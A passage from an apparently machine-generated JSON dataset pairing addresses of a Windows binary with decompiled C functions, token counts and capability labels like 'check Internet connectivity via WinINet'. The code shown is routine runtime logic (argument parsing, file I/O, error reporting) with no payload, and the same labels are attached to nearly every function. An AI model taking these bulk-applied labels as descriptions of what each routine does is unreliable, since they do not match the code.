            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402f84(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00407688();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00407688();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00402fa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402fa4(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00407688();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00407688();\n        return *(*piVar1 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "0040305c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403031)\n// WARNING: Removing unreachable block (ram,0x00403036)\n\nvoid __fastcall fcn.0040305c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407688(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x495008 != NULL) {\n            (**0x495008)();\n        }\n        fcn.00407688();\n        fcn.00402ff8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "004031fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004031fc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t *puStack20;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puStack20 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (puVar3 = in_EAX,  0x20 < *puVar3) {\n        if (*puVar3 == 0x22) {\n            puVar2 = sub.user32.dll_CharNextA(puVar3);\n            while ((puVar5 = puVar2,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar2 = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n            in_EAX = puVar5;\n            if (*puVar5 != 0) {\n                in_EAX = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            in_EAX = sub.user32.dll_CharNextA();\n            puStack20 = puVar3;\n        }\n    }\n    fcn.00405c6c();\n    iVar1 = *param_2;\n    iVar6 = 0;\n    puVar3 = puStack20;\n    while (puVar2 = puVar3,  0x20 < *puVar2) {\n        if (*puVar2 == 0x22) {\n            puVar3 = sub.user32.dll_CharNextA(puVar2);\n            while ((puVar5 = puVar3,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar4 = sub.user32.dll_CharNextA(puVar2);\n                for (puVar3 = puVar5; puStack20 = puVar5,  puVar3 < puVar4; puVar3 = puVar3 + 1) {\n                    *(iVar1 + iVar6) = *puVar3;\n                    iVar6 = iVar6 + 1;\n                }\n            }\n            puVar3 = puVar5;\n            if (*puVar5 != 0) {\n                puVar3 = sub.user32.dll_CharNextA(puVar2);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            puVar5 = sub.user32.dll_CharNextA();\n            for (puVar3 = puVar2; puStack20 = puVar2,  puVar3 < puVar5; puVar3 = puVar3 + 1) {\n                *(iVar1 + iVar6) = *puVar3;\n                iVar6 = iVar6 + 1;\n            }\n        }\n    }\n    return CONCAT44(puStack20, puVar2);\n}\n",
        "token_count": 731
    },
    "004032f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403330)\n\nvoid fcn.004032f8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x403349;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    sub.kernel32.dll_GetCommandLineA();\n    fcn.004031fc();\n    fcn.004031fc();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x403350;\n    uStack24 = 0x403348;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 175
    },
    "00403358": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403358(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar auStack276 [264];\n    \n    fcn.00405530();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack276, 0x105);\n        fcn.00405620();\n    }\n    else {\n        sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            fcn.004031fc();\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0040484c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040484c(uint param_1, uint param_2)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.0040481c(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00404859. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x49502c != NULL) {\n        (**0x49502c)();\n    }\n    *0x491004 = param_2;\n    *0x491000 = 0xd2;\n    fcn.00405388();\n    return;\n}\n",
        "token_count": 168
    },
    "0040349c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040349c(uint param_1, ushort param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    uVar1 = *(in_EAX + 4);\n    if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {\n        iVar2 = 0x66;\n    }\n    else {\n        if (uVar1 != 0xd7b0) {\n            fcn.00403918();\n        }\n        *(in_EAX + 4) = param_2;\n        if ((*(in_EAX + 0x48) == '\\0') && (*(in_EAX + 0x18) == 0)) {\n            *(in_EAX + 0x18) = 0x4035c4;\n        }\n        iVar2 = (**(in_EAX + 0x18))();\n    }\n    if (iVar2 != 0) {\n        fcn.0040307c();\n    }\n    return iVar2;\n}\n",
        "token_count": 241
    },
    "00403d88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d88(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 1) != 0xd7b0) {\n        if (3 < *(in_EAX + 1) - 0xd7b0) goto code_r0x00403e5c;\n        iVar1 = (*in_EAX[9])();\n        if (iVar1 != 0) {\n            fcn.0040307c();\n        }\n    }\n    *(in_EAX + 1) = 0xd7b3;\n    in_EAX[2] = param_2;\n    in_EAX[9] = 0x403d60;\n    in_EAX[7] = 0x403554;\n    if (*(in_EAX + 0x12) == '\\0') {\n        in_EAX[9] = 0x403554;\n        if (param_1 == 3) {\n            uVar2 = 0xfffffff5;\n        }\n        else {\n            uVar2 = 0xfffffff6;\n        }\n        iVar1 = sub.kernel32.dll_GetStdHandle(uVar2);\n    }\n    else {\n        if (((param_1 != 3) && (param_1 != 2)) && (*(in_EAX + 1) = 0xd7b2,  param_1 != 1)) {\n            *(in_EAX + 1) = 0xd7b1;\n        }\n        iVar1 = sub.kernel32.dll_CreateFileA();\n    }\n    if (iVar1 != -1) {\n        *in_EAX = iVar1;\n        return;\n    }\n    *(in_EAX + 1) = 0xd7b0;\n    sub.kernel32.dll_GetLastError();\ncode_r0x00403e5c:\n    fcn.0040307c();\n    return;\n}\n",
        "token_count": 434
    },
    "00404030": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404030(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    while (0x40 < param_2) {\n        param_2 = param_2 + -0x40;\n        fcn.00403fdc();\n        iVar2 = fcn.00407688();\n        if (*(iVar2 + 4) != 0) {\n            return in_EAX;\n        }\n    }\n    if (0 < param_2) {\n        puVar3 = 0x404060;\n        if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f98(param_2, 0x404060),  cVar1 != '\\0')) {\n            while( true ) {\n                puVar4 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n                iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n                if (param_2 < iVar2) break;\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n                param_2 = param_2 - iVar2;\n                for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar2 = (**(in_EAX + 0x1c))();\n                if (iVar2 != 0) {\n                    fcn.0040307c();\n                    return in_EAX;\n                }\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_2;\n            for (; param_2 != 0; param_2 = param_2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        return in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 505
    },
    "00404704": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404704(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x404788;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.00404798();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.004046d4();\n            fcn.00407024();\n        }\n        else {\n            *param_1 = in_EAX + *(iVar1 + 0x14);\n            if (*param_1 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40478f;\n    uStack32 = 0x404787;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 282
    },
    "00404a48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a48(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x491028 != '\\0') {\n        auStack12[0] = param_2;\n        (**0x495014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004052fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004052fc(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char *pcStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x49504c != '\\0') {\n        if ((*0x495220 == -0x284e) && (*0x495228 != 0)) {\n            uStack8 = 0x405325;\n            (**0x495238)();\n        }\n        pcStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        pcStack16 = 0x1e;\n        pcStack20 = \"Runtime error     at 00000000\";\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x40533a;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x405384, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x491030 == '\\0') {\n        uStack8 = 0;\n        pcStack12 = \"Error\";\n        pcStack16 = \"Runtime error     at 00000000\";\n        pcStack20 = NULL;\n        uStack24 = 0x405379;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00405388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405388(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x4977f0 == 0) && (*0x495048 != NULL)) {\n        do {\n            pcVar1 = *0x495048;\n            *0x495048 = NULL;\n            (*pcVar1)();\n        } while (*0x495048 != NULL);\n    }\n    if (*0x491004 != 0) {\n        fcn.00405268();\n        fcn.004052fc();\n        *0x491004 = 0;\n    }\n    do {\n        if ((*0x4977f0 == 2) && (*0x491000 == 0)) {\n            *0x4977d4 = 0;\n        }\n        fcn.00405110();\n        if (((*0x4977f0 < 2) || (*0x491000 != 0)) && (*0x4977d8 != 0)) {\n            fcn.00406f9c();\n            iVar2 = *(*0x4977d8 + 0x10);\n            if ((iVar2 != *(*0x4977d8 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.004050e8();\n        if (*0x4977f0 == 1) {\n            (**0x4977ec)();\n        }\n        if (*0x4977f0 != 0) {\n            fcn.004052cc();\n        }\n        if (*0x4977c8 == NULL) {\n            if (*0x495028 != NULL) {\n                (**0x495028)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x491000);\n        }\n        puVar3 = *0x4977c8;\n        puVar4 = 0x4977c8;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 501
    },
    "004054b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054b4(uint lpThreadId, uint dwCreationFlags, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint in_ECX;\n    uint dwStackSize;\n    \n    if (*0x491038 == NULL) {\n        puVar1 = fcn.00402f00();\n        *puVar1 = in_ECX;\n        puVar1[1] = arg_10h;\n    }\n    else {\n        (**0x491038)();\n    }\n    *0x49504d = 1;\n    sub.kernel32.dll_CreateThread();\n    return;\n}\n",
        "token_count": 130
    },
    "00405514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405514 noreturn (void)\n\n{\n    if (*0x49103c != NULL) {\n        (**0x49103c)();\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 57
    },
    "004060e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004060e0(void)\n\n{\n    if (*0x491010 != NULL) {\n        (**0x491010)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 47
    },
    "004060f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.004060f8(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00405530();\n            }\n            else {\n                fcn.00405554();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405d28();\n            }\n            else {\n                fcn.00405d40();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.004060e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.004060f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004060ac();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.0040700c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x495008 != NULL) {\n                    (**0x495008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            do {\n                fcn.00406934();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "004061f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004061f0(void)\n\n{\n    if (*0x491018 != NULL) {\n        (**0x491018)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 47
    },
    "00406554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406638)\n// WARNING: Removing unreachable block (ram,0x00406727)\n// WARNING: Removing unreachable block (ram,0x0040672e)\n// WARNING: Removing unreachable block (ram,0x004066b4)\n// WARNING: Removing unreachable block (ram,0x004066ca)\n// WARNING: Removing unreachable block (ram,0x00406738)\n// WARNING: Removing unreachable block (ram,0x0040673b)\n// WARNING: Removing unreachable block (ram,0x00406741)\n// WARNING: Removing unreachable block (ram,0x004066c0)\n\nulong __fastcall fcn.00406554(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    int32_t *piStack36;\n    uint32_t uStack28;\n    int32_t iStack24;\n    \n    iVar7 = 1;\n    uStack28 = 0;\n    iStack24 = 0;\n    if (in_EAX == 0) {\n        *param_2 = 1;\n        goto code_r0x0040675c;\n    }\n    for (; *(in_EAX + -1 + iVar7) == ' '; iVar7 = iVar7 + 1) {\n    }\n    bVar9 = false;\n    cVar4 = *(in_EAX + -1 + iVar7);\n    if (cVar4 == '-') {\n        bVar9 = true;\n        iVar7 = iVar7 + 1;\n    }\n    else if (cVar4 == '+') {\n        iVar7 = iVar7 + 1;\n    }\n    uVar2 = 1;\n    piStack36 = param_2;\n    if (((*(in_EAX + -1 + iVar7) == '$') || (cVar4 = fcn.004033fc(),  cVar4 == 'X')) ||\n       ((*(in_EAX + -1 + iVar7) == '0' && (cVar4 = fcn.004033fc(),  cVar4 == 'X')))) {\n        if (*(in_EAX + -1 + iVar7) == '0') {\n            iVar7 = iVar7 + 1;\n        }\n        do {\n            iVar7 = iVar7 + 1;\n            uVar1 = *(in_EAX + -1 + iVar7);\n            if (uVar1 - 0x30 < 10) {\n                uVar8 = uVar1 - 0x30;\n            }\n            else if (uVar1 + 0xbf < 6) {\n                uVar8 = uVar1 - 0x37;\n            }\n            else {\n                if (5 < uVar1 + 0x9f) goto code_r0x0040666a;\n                uVar8 = uVar1 - 0x57;\n            }\n            if (((iStack24 != 0) && (iStack24 < 0)) || ((iStack24 != 0xfffffff && (0xfffffff < iStack24))))\n            goto code_r0x0040666a;\n            uVar3 = uStack28 >> 0x1c;\n            uVar5 = uStack28 * 0x10;\n            uStack28 = uVar5 + uVar8;\n            iStack24 = (iStack24 << 4 | uVar3) + (uVar8 >> 0x1f) + CARRY4(uVar5, uVar8);\n            uVar2 = 0;\n        } while( true );\n    }\n    for (; *(in_EAX + -1 + iVar7) - 0x30U < 10; iVar7 = iVar7 + 1) {\n        uVar2 = *(in_EAX + -1 + iVar7);\n        iVar6 = fcn.0040649c();\n        piStack36 = (uVar2 - 0x30) + iVar6;\n        uVar2 = 0;\n    }\n    iStack24 = 0;\n    uStack28 = 0;\n    goto code_r0x00406742;\ncode_r0x0040666a:\n    if (bVar9) {\n        bVar9 = uStack28 != 0;\n        uStack28 = -uStack28;\n        iStack24 = -(iStack24 + bVar9);\n    }\ncode_r0x00406742:\n    if (uVar2 | *(in_EAX + -1 + iVar7) != '\\0') {\n        *piStack36 = iVar7;\n    }\n    else {\n        *piStack36 = 0;\n    }\ncode_r0x0040675c:\n    return CONCAT44(iStack24, uStack28);\n}\n",
        "token_count": 1084
    },
    "004069c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004069c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.00406c2c();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 154
    },
    "00406a68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00406a68(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint *puVar6;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    int32_t hFindFile;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    hFindFile = sub.kernel32.dll_GetModuleHandleA(0x406c08);\n    if (((hFindFile == 0) || (pcVar1 = sub.kernel32.dll_GetProcAddress(hFindFile, 0x406c18),  pcVar1 == NULL)) ||\n       (iVar2 = (*pcVar1)(lpString1, &lpFileName, 0x105),  iVar2 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406a48();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406a48();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            pcVar3 = lpString1 + 2;\n        }\n        iVar2 = pcVar3 - lpString1;\n        puVar6 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar6, lpString1, iVar2 + 1);\n        while (*pcVar3 != '\\0') {\n            pcVar4 = fcn.00406a48();\n            if (0x105 < pcVar4 + (iVar2 - pcVar3) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2, pcVar3, pcVar4 + (1 - pcVar3));\n            hFindFile = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (hFindFile == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(hFindFile);\n            iVar5 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar5 + iVar2 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar2) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2 + 1, &lpString2, 0x104 - iVar2);\n            puVar6 = &lpString2;\n            iVar5 = sub.kernel32.dll_lstrlenA();\n            iVar2 = iVar2 + iVar5 + 1;\n            pcVar3 = pcVar4;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar6);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, 